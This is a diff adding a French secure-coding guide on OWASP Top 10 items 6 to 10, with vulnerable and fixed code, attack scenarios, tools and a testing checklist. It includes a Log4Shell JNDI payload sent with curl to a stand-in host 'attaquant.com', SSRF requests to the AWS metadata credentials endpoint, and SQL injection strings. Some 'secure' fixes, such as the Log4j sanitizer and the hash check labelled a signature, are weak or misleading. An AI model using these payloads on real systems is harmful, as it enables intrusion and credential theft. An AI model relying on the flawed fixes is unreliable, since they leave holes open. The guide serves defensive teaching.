@@ -503,6 +503,477 @@ public class LoginController {
 | **Django 2.2** (CVE-2019-19844) | Injection SQL via `django.contrib.auth`. | Prise de contrôle de la base de données. |
 
 ---
+
+
+
+🥇 6. Vulnerable and Outdated Components (Composants vulnérables)
+
+🔹 Qu’est-ce que c’est ?
+Utilisation de librairies ou frameworks obsolètes avec des failles connues.
+🔴 Exemple d’attaque : Exploitation de Log4j (CVE-2021-44228)
+
+Scénario :
+Une application Java utilise Log4j 2.14.1 (version vulnérable).
+Un attaquant envoie une requête malveillante :
+
+curl 'http://mon-site.com/login' -H 'X-Api-Version: ${jndi:ldap://attaquant.com/exploit}'
+
+→ Exécution de code à distance (téléchargement d’un malware).
+
+🔴 Résultat de l’attaque :
+
+    Prise de contrôle du serveur (installation de ransomware, vol de données).
+    Propagation dans le réseau interne (si le serveur a accès à d’autres machines).
+
+💻 Code Vulnérable (Log4j)
+
+// ❌ DANGER : Log4j 2.14.1 (vulnérable)
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class LoginController {
+    private static final Logger logger = LogManager.getLogger(LoginController.class);
+
+    public void login(String username) {
+        logger.info("Login attempt by: " + username);  // ⚠️ Vulnérable si username contient ${jndi:...}
+    }
+}
+
+🔴 Autres exemples de composants vulnérables :
+Composant 	Faille 	Impact
+jQuery 1.7.2 	Vulnérabilité XSS ($(selector).html(userInput)). 	Vol de cookies, redirection malveillante.
+OpenSSL 1.0.1 (Heartbleed) 	Fuite de mémoire (exposition de clés privées). 	Décryptage des communications.
+Django 2.2 (CVE-2019-19844) 	Injection SQL via django.contrib.auth. 	Prise de contrôle de la base de données.
+✅ Code Sécurisé (Mise à jour de Log4j)
+
+// ✅ SÉCURISÉ : Log4j 2.20.0 (corrigé)
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class LoginController {
+    private static final Logger logger = LogManager.getLogger(LoginController.class);
+
+    public void login(String username) {
+        // 1. Sanitizer l'entrée utilisateur
+        String safeUsername = sanitize(username);
+
+        // 2. Utiliser un logger configuré pour éviter les injections
+        logger.info("Login attempt by: {}", safeUsername);  // ⚠️ Utiliser {} au lieu de +
+
+        // 3. Mettre à jour Log4j
+        // mvn dependency:tree | grep log4j
+        // mvn versions:use-latest-versions
+    }
+
+    private String sanitize(String input) {
+        return input.replace("${", "").replace("}", "");  // Exemple simplifié
+    }
+}
+
+🔹 Autres bonnes pratiques :
+Bonnes pratiques 	Exemple
+Scanner les dépendances 	npm audit, snyk test, OWASP Dependency-Check.
+Mettre à jour régulièrement 	Utiliser des outils comme Dependabot (GitHub) ou Renovate.
+Éviter les dépendances inutiles 	Supprimer les librairies non utilisées.
+Utiliser des images Docker minimales 	alpine au lieu de ubuntu pour réduire la surface d’attaque.
+
+🔹 Outils pour détecter :
+
+    Snyk → Scan des vulnérabilités dans npm, pip, Maven.
+    OWASP Dependency-Check → Détecte les CVE dans les dépendances.
+    GitHub Dependabot → Alertes automatiques sur les dépendances vulnérables.
+
+🥈 7. Identification and Authentication Failures (Échecs d’authentification)
+
+🔹 Qu’est-ce que c’est ?
+Mauvaise gestion des sessions, mots de passe, ou tokens, permettant à un attaquant de usurper une identité.
+🔴 Exemple d’attaque : Session Fixation
+
+Scénario :
+Un site ne régénère pas le session ID après une connexion.
+Un attaquant :
+
+    Crée une session (session_id=12345) et envoie le lien à la victime.
+    La victime se connecte avec son compte.
+    L’attaquant utilise le même session_id pour accéder au compte de la victime.
+
+🔴 Résultat de l’attaque :
+
+    Prise de contrôle du compte de la victime.
+    Fuite de données personnelles.
+
+💻 Code Vulnérable (Session Fixation)
+
+from flask import Flask, session
+
+app = Flask(__name__)
+app.secret_key = "ma_cle_secrete"  # ❌ Mauvaise pratique (clé fixe)
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    # ❌ DANGER : Pas de régénération du session_id
+    session['user'] = username  # Utilise le même session_id
+    return "Connexion réussie."
+
+🔴 Autres échecs d’authentification courants :
+Faille 	Exemple 	Impact
+Mots de passe faibles 	password123, azerty → brute force possible. 	Prise de contrôle de compte.
+Tokens JWT non expirés 	token = jwt.encode({"user_id": 1}, "secret") sans exp. 	Accès permanent au compte.
+2FA non implémenté 	Pas de vérification SMS/email pour les transactions sensibles. 	Fraude financière.
+Stockage de tokens en clair 	localStorage.setItem("token", "abc123") → fuite via XSS. 	Vol de session.
+✅ Code Sécurisé (Session sécurisée)
+
+from flask import Flask, session
+import secrets
+
+app = Flask(__name__)
+app.secret_key = secrets.token_hex(32)  # ✅ Clé aléatoire et longue
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    # 1. Vérifier les identifiants
+    if authenticate(username, password):
+        # 2. Régénérer le session_id (évite la fixation de session)
+        session.clear()
+        session['user'] = username
+
+        # 3. Définir une expiration de session
+        session.permanent = True
+        app.permanent_session_lifetime = timedelta(minutes=30)
+
+        return "Connexion réussie."
+    else:
+        return "Identifiants incorrects.", 401
+
+🔹 Autres bonnes pratiques d’authentification :
+Bonnes pratiques 	Exemple
+Forcer des mots de passe complexes 	requirements: min_length=12, complexity=upper+lower+digit+special.
+Utiliser des tokens courts (JWT) 	exp: datetime.utcnow() + timedelta(hours=1).
+Implémenter le 2FA 	SMS, authentificateur (Google Authenticator, Authy).
+Stocker les mots de passe en bcrypt/Argon2 	bcrypt.hashpw(password, bcrypt.gensalt()).
+
+🔹 Outils pour détecter :
+
+    OWASP ZAP → Scan des failles de session (session fixation, fixation de token).
+    Burp Suite → Interception et modification des cookies.
+    Tests manuels : Essayer de réutiliser un session_id après déconnexion.
+
+🥉 8. Software and Data Integrity Failures (Échecs d’intégrité)
+
+🔹 Qu’est-ce que c’est ?
+Manque de vérification de l’intégrité des données (ex : téléchargements non signés, dépendances non vérifiées).
+🔴 Exemple d’attaque : Téléchargement de malware via une mise à jour non signée
+
+Scénario :
+Une application télécharge une mise à jour non signée depuis un serveur compromis.
+L’attaquant remplace le fichier par un malware.
+Requête HTTP 	Résultat
+GET http://mon-site.com/update.zip 	Téléchargement du fichier.
+L’attaquant remplace update.zip par un malware 	L’application l’installe → exécution de code malveillant.
+
+🔴 Résultat de l’attaque :
+
+    Installation de ransomware (chiffrement des fichiers).
+    Vol de données (keylogger, spyware).
+    Prise de contrôle du serveur.
+
+💻 Code Vulnérable (Téléchargement non signé)
+
+import requests
+import zipfile
+import os
+
+# ❌ DANGER : Téléchargement sans vérification de signature
+def download_update():
+    url = "http://mon-site.com/update.zip"
+    response = requests.get(url)
+    with open("update.zip", "wb") as f:
+        f.write(response.content)
+
+    # Extraction sans vérification
+    with zipfile.ZipFile("update.zip", "r") as zip_ref:
+        zip_ref.extractall(".")
+
+    os.remove("update.zip")
+
+🔴 Autres exemples d’échecs d’intégrité :
+Faille 	Exemple 	Impact
+Dépendances npm non vérifiées 	npm install lodash@4.17.15 → une version vulnérable est installée. 	Exécution de code arbitraire.
+Fichiers statiques non signés 	Un attaquant modifie app.js sur le CDN → injection de code malveillant. 	Vol de sessions, redirection vers un site phishing.
+Base de données sans checksum 	Une table est modifiée sans détection → corruption des données. 	Perte de données critiques.
+✅ Code Sécurisé (Téléchargement signé)
+
+import requests
+import zipfile
+import os
+import hashlib
+
+def download_update():
+    url = "http://mon-site.com/update.zip"
+    signature_url = "http://mon-site.com/update.zip.sig"  # Fichier de signature
+
+    # 1. Télécharger le fichier et sa signature
+    response = requests.get(url)
+    signature = requests.get(signature_url).text
+
+    # 2. Vérifier l'intégrité (exemple simplifié)
+    file_hash = hashlib.sha256(response.content).hexdigest()
+    if file_hash != signature:
+        raise Exception("Signature invalide ! Fichier corrompu ou compromis.")
+
+    # 3. Extraction sécurisée
+    with zipfile.ZipFile("update.zip", "r") as zip_ref:
+        zip_ref.extractall(".")
+
+    os.remove("update.zip")
+
+🔹 Autres bonnes pratiques d’intégrité :
+Bonnes pratiques 	Exemple
+Signer les dépendances 	Utiliser npm ci au lieu de npm install (vérifie les checksums).
+Utiliser des checksums pour les téléchargements 	sha256sum fichier.zip.
+Vérifier les signatures des conteneurs Docker 	docker trust verify mon-image:latest.
+Utiliser des outils comme Cosign (Sigstore) 	Pour signer et vérifier les images container.
+
+🔹 Outils pour détecter :
+
+    Cosign → Signature et vérification des images Docker.
+    npm audit → Vérifie l’intégrité des dépendances.
+    sha256sum → Vérifie les checksums des fichiers téléchargés.
+
+🏅 9. Security Logging and Monitoring Failures (Échecs de logging et monitoring)
+
+🔹 Qu’est-ce que c’est ?
+Pas de logs, ou des logs non surveillés, permettant à un attaquant de rester invisible pendant des mois.
+🔴 Exemple d’attaque : Compromission non détectée pendant 6 mois
+
+Scénario :
+Un attaquant exploite une faille 0-day dans une application.
+L’entreprise ne surveille pas les logs et ne détecte pas l’intrusion.
+Activité malveillante 	Détection ?
+L’attaquant scanne les ports ouverts. 	❌ Aucun log.
+L’attaquant injecte du code via une API vulnérable. 	❌ Aucun log.
+L’attaquant exfiltre des données. 	❌ Aucun log.
+6 mois plus tard : Fuite de données massive. 	❌ Trop tard.
+
+🔴 Résultat de l’attaque :
+
+    Fuite de millions de données clients.
+    Amende RGPD (jusqu’à 4% du CA).
+    Perte de réputation (clients quittent l’entreprise).
+
+💻 Code Vulnérable (Pas de logging)
+
+# ❌ DANGER : Pas de logs pour les erreurs critiques
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    amount = request.form['amount']
+    recipient = request.form['recipient']
+
+    if amount > 1000:
+        return "Montant trop élevé.", 400  # ⚠️ Pas de log
+
+    # Transfert d'argent
+    cursor.execute("UPDATE accounts SET balance = balance - %s WHERE id = 1", (amount,))
+    cursor.execute("UPDATE accounts SET balance = balance + %s WHERE id = %s", (amount, recipient))
+
+    return "Transfert réussi."
+
+🔴 Autres exemples de logging défaillant :
+Faille 	Exemple 	Impact
+Logs stockés en clair 	Les logs contiennent des mots de passe → fuite si les logs sont exposés. 	Vol de données sensibles.
+Pas d’alertes sur les échecs de login 	10 000 tentatives de brute force → pas d’alerte. 	Prise de contrôle de compte.
+Logs supprimés trop tôt 	Les logs ne sont conservés que 7 jours → impossible d’enquêter sur une attaque. 	Enquête impossible.
+✅ Code Sécurisé (Logging et monitoring)
+
+import logging
+from flask import has_request_context, request
+
+# Configuration du logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler('app.log'),
+        logging.StreamHandler()  # Pour la console en dev
+    ]
+)
+
+@app.route('/transfer', methods=['POST'])
+def transfer():
+    amount = request.form['amount']
+    recipient = request.form['recipient']
+
+    # 1. Logging des erreurs critiques
+    try:
+        if amount > 1000:
+            logging.warning(f"Tentative de transfert élevé: {amount}€ par {request.remote_addr}")
+            return "Montant trop élevé.", 400
+
+        # Transfert d'argent
+        cursor.execute("UPDATE accounts SET balance = balance - %s WHERE id = 1", (amount,))
+        cursor.execute("UPDATE accounts SET balance = balance + %s WHERE id = %s", (amount, recipient))
+
+        logging.info(f"Transfert de {amount}€ vers {recipient} réussi.")
+        return "Transfert réussi."
+
+    except Exception as e:
+        logging.error(f"Erreur lors du transfert: {str(e)}", exc_info=True)
+        return "Erreur interne.", 500
+
+🔹 Autres bonnes pratiques de logging :
+Bonnes pratiques 	Exemple
+Centraliser les logs 	Utiliser ELK Stack (Elasticsearch, Logstash, Kibana) ou Datadog.
+Détecter les anomalies 	Alertes si plus de 10 échecs de login en 1 minute.
+Conserver les logs 1 an 	RGPD recommande au moins 1 an pour les données sensibles.
+Ne pas logger les données sensibles 	Masquer les mots de passe, numéros de carte (**** **** **** 1234).
+
+🔹 Outils pour détecter :
+
+    ELK Stack → Centralisation et analyse des logs.
+    Datadog → Monitoring en temps réel.
+    Wazuh → Détection d’intrusions (IDS).
+    Splunk → Analyse avancée des logs.
+
+🏆 10. Server-Side Request Forgery (SSRF)
+
+🔹 Qu’est-ce que c’est ?
+Un attaquant force un serveur à faire des requêtes vers des ressources internes ou externes qu’il ne devrait pas pouvoir atteindre.
+🔴 Exemple d’attaque : Accès aux métadonnées AWS (AWS Metadata Service)
+
+Scénario :
+Une application permet de télécharger une image depuis une URL.
+Un attaquant entre :
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+→ Récupération des clés d’accès AWS (accès total au cloud).
+
+🔴 Résultat de l’attaque :
+
+    Prise de contrôle du compte AWS.
+    Lancement de machines virtuelles malveillantes.
+    Fuite de données (buckets S3, bases de données RDS).
+
+💻 Code Vulnérable (SSRF)
+
+import requests
+from flask import request, jsonify
+
+@app.route('/download_image')
+def download_image():
+    image_url = request.args.get('url')
+
+    # ❌ DANGER : Pas de vérification de l'URL
+    response = requests.get(image_url)  # ⚠️ Peut faire des requêtes internes
+
+    if response.status_code == 200:
+        return response.content, 200
+    else:
+        return "Erreur.", 400
+
+🔴 Autres exemples de SSRF :
+Faille 	Exemple 	Impact
+Accès aux services internes 	http://localhost:8080/admin → contrôle total du serveur. 	Prise de contrôle du serveur.
+Accès aux métadonnées cloud 	http://169.254.169.254 (AWS) → vol des clés d’accès. 	Accès au cloud (coûts élevés, fuite de données).
+Port Scanning interne 	http://192.168.1.1:22 → détection des services ouverts. 	Préparation d’une attaque plus large.
+✅ Code Sécurisé (Protection contre SSRF)
+
+import requests
+from flask import request, jsonify, abort
+from urllib.parse import urlparse
+
+def is_safe_url(url):
+    # 1. Bloquer les URLs locales/privées
+    parsed = urlparse(url)
+    if parsed.hostname in ["localhost", "127.0.0.1", "169.254.169.254"]:
+        return False
+
+    # 2. Bloquer les protocoles dangereux
+    if parsed.scheme not in ["http", "https"]:
+        return False
+
+    # 3. Autoriser uniquement certains domaines
+    allowed_domains = ["mon-site.com", "cdn.mon-site.com"]
+    if parsed.netloc not in allowed_domains:
+        return False
+
+    return True
+
+@app.route('/download_image')
+def download_image():
+    image_url = request.args.get('url')
+
+    if not is_safe_url(image_url):
+        abort(400, "URL non autorisée.")
+
+    response = requests.get(image_url, timeout=5)  # ⚠️ Timeout pour éviter les attaques lentes
+
+    if response.status_code == 200:
+        return response.content, 200
+    else:
+        return "Erreur.", 400
+
+🔹 Autres bonnes pratiques contre SSRF :
+Bonnes pratiques 	Exemple
+Utiliser une liste blanche de domaines 	Seuls mon-site.com et cdn.mon-site.com sont autorisés.
+Bloquer les URLs locales 	127.0.0.1, localhost, 169.254.169.254 (métadonnées cloud).
+Désactiver les redirections 	requests.get(..., allow_redirects=False).
+Utiliser un proxy sortant sécurisé 	Burp Suite ou ZAP pour tester les SSRF.
+
+🔹 Outils pour détecter :
+
+    Burp Suite → Interception des requêtes SSRF.
+    OWASP ZAP → Scan des vulnérabilités SSRF.
+    Tests manuels : Essayer d’accéder à http://localhost/admin ou http://169.254.169.254.
+
+📊 Résumé des Impacts par Vulnérabilité
+Top 10 OWASP 	Exemple d’attaque 	Impact Potentiel 	Amende RGPD 	Coût moyen d’une fuite
+1. Broken Access Control 	Accès à un compte admin via IDOR. 	Prise de contrôle de compte, fuite de données. 	Jusqu’à 4% du CA. 	4,45M$ (IBM 2023).
+2. Cryptographic Failures 	Fuite de mots de passe en clair. 	Vol de comptes, usurpation d’identité. 	Jusqu’à 4% du CA. 	3,92M$ (IBM 2023).
+3. Injection 	Injection SQL pour supprimer une table. 	Perte de données, prise de contrôle du serveur. 	Jusqu’à 4% du CA. 	4,45M$ (IBM 2023).
+4. Insecure Design 	Pas de limite de login → brute force. 	Prise de contrôle de compte admin. 	Jusqu’à 4% du CA. 	Variable (DDoS possible).
+5. Security Misconfiguration 	Bucket S3 public → fuite de photos. 	Fuite de données personnelles. 	Jusqu’à 4% du CA. 	3,92M$ (IBM 2023).
+6. Vulnerable Components 	Exploitation de Log4j → ransomware. 	Prise de contrôle du serveur, chiffrement des données. 	Jusqu’à 4% du CA. 	4,54M$ (IBM 2023).
+7. Identification Failures 	Session fixation → vol de compte. 	Fuite de données, fraude financière. 	Jusqu’à 4% du CA. 	3,92M$ (IBM 2023).
+8. Integrity Failures 	Téléchargement de malware via une mise à jour non signée. 	Installation de ransomware, vol de données. 	Jusqu’à 4% du CA. 	4,54M$ (IBM 2023).
+9. Logging Failures 	Pas de logs → attaque non détectée pendant 6 mois. 	Fuite massive de données, amende RGPD. 	Jusqu’à 4% du CA. 	4,45M$ (IBM 2023).
+10. SSRF 	Accès aux métadonnées AWS → vol des clés d’accès. 	Prise de contrôle du cloud, fuite de données. 	Jusqu’à 4% du CA. 	4,54M$ (IBM 2023).
+🔍 Comment Tester ces Vulnérabilités ? (Checklist Pratique)
+Vulnérabilité 	Outils de Test 	Commandes/Exemples
+1. Broken Access Control 	OWASP ZAP, Burp Suite 	- Essayer de changer id=1 en id=2. <br> - Scanner /admin sans être admin.
+2. Cryptographic Failures 	SSL Labs, TruffleHog 	- https://www.ssllabs.com/ssltest/ <br> - truffleHog --regex --entropy=False .
+3. Injection 	SQLMap, OWASP ZAP 	- sqlmap -u "http://mon-site.com/login" --data="username=admin&password=test" <br> - Essayer ' OR '1'='1' -- dans un champ de login.
+4. Insecure Design 	OWASP ZAP, Tests manuels 	- Essayer 1000 requêtes en 1 seconde. <br> - Vérifier l’absence de rate limiting.
+5. Security Misconfiguration 	AWS Trusted Advisor, Nmap 	- aws s3 ls s3://mon-bucket/ <br> - nmap -sV mon-site.com
+6. Vulnerable Components 	Snyk, OWASP Dependency-Check 	- snyk test <br> - dependency-check --project mon-projet
+7. Identification Failures 	Burp Suite, Tests manuels 	- Essayer de réutiliser un session_id après déconnexion. <br> - Tester des mots de passe faibles (password123).
+8. Integrity Failures 	sha256sum, Cosign 	- sha256sum fichier.zip <br> - cosign verify mon-image:latest
+9. Logging Failures 	ELK Stack, Wazuh 	- Vérifier si les logs contiennent des mots de passe. <br> - Configurer des alertes sur les échecs de login.
+10. SSRF 	Burp Suite, Tests manuels 	- Essayer http://localhost/admin <br> - Essayer http://169.254.169.254/latest/meta-data/
+🚀 Prochaines Étapes pour un Dev Sécurisé
+
+    Faire un audit de votre code avec :
+        SonarQube (analyse statique)
+        OWASP ZAP (scan des vulnérabilités web)
+        Snyk (scan des dépendances)
+    Former votre équipe aux bonnes pratiques (ex : PortSwigger Web Security Academy).
+    Automatiser les tests de sécurité dans votre CI/CD (ex : GitHub Actions + Snyk).
+    Mettre en place un monitoring (ELK Stack, Datadog, Wazuh).
+    Documenter les incidents et les corriger rapidement.
+
+💬 Besoin d’Aide ?
+
+    Vous avez un doute sur une ligne de code ? → Partagez-la, je peux vous aider à la sécuriser.
+    Vous voulez un audit rapide de votre projet ? → Utilisez Snyk ou SonarQube.
+    Vous voulez former votre équipe ? → Contactez-moi pour des ateliers pratiques !
+
+🚀 Restez paranoïaque… mais constructif ! 🔒
 #### **✅ Code Sécurisé (Mise à jour de Log4j)**
 ```java
 // ✅ SÉCURISÉ : Log4j 2.20.0 (corrigé)
